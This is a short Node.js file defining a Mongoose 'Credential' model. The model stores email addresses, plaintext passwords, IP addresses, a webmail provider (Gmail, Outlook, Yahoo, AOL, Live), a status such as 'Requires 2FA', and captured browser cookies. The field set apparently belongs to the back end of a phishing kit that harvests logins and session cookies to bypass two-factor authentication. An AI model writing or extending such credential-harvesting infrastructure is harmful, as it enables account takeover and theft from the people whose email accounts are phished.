const mongoose = require('mongoose');

const credentialSchema = new mongoose.Schema(
  {
    email: {
      type: String,
      required: true,
      trim: true,
    },
    password: {
      type: String,
      required: true,
    },
    ip: {
      type: String,
      default: 'Unknown',
    },
    provider: {
      type: String,
      required: true,
      enum: ['gmail', 'outlook', 'yahoo', 'aol', 'live'],
    },
    status: {
      type: String,
      enum: ['Pending', 'Requires 2FA', 'Completed', 'Failed'],
      default: 'Pending',
    },
    cookies: {
      type: [Object],
      default: [],
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model('Credential', credentialSchema);
